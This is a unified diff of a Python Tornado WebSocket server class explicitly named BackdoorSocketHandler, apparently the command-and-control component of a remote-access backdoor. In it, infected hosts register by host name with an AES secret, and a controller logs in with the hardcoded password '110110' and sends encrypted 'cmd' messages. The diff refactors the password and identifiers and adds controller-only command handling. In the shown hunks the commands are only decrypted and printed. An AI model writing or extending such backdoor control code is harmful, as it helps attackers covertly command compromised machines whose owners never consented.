@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# coding:utf-8
+# -*- coding: utf-8 -*-
 import tornado.web
 import tornado.websocket
 import tornado.ioloop
@@ -8,10 +8,12 @@ from base64 import b64encode, b64decode
 from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
+# config
+PASSWORD = '110110'
+
 
 class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     clients = set()
-    PASSWORD = '110110'
 
     def data_received(self, chunk):
         pass
@@ -23,7 +25,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
     def __init__(self, application, request, **kwargs):
         tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
-        self.ID = None
+        self.HOST_NAME = None
         self.IV = '\0' * AES.block_size
         self.SECRET = None
         self.is_controller = False
@@ -47,11 +49,11 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
     def on_message(self, message):
         msg = json.loads(message)
-        if 'id' in msg:
-            self.ID = msg['id']
+        if 'host_name' in msg:
+            self.HOST_NAME = msg['host_name']
             self.SECRET = b64decode(msg['secret'])
             if 'pwd' in msg:
-                if BackdoorSocketHandler.PASSWORD == self.decrypt(msg['pwd']):
+                if PASSWORD == self.decrypt(msg['pwd']):
                     self.is_controller = True
                     self.send_msg('login success')
                 else:
@@ -59,12 +61,12 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                     return
 
             BackdoorSocketHandler.clients.add(self)
-            print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'
+            print 'find new client: ' + self.request.remote_ip + '(' + self.HOST_NAME + ')'
 
-        if self.ID:
-            if 'data' in msg:
-                data = self.decrypt(msg['data'])
-                print data
+        if self.HOST_NAME:
+            if self.is_controller and 'cmd' in msg:
+                command = self.decrypt(msg['cmd'])
+                print command
 
     def on_close(self):
         if self in BackdoorSocketHandler.clients:
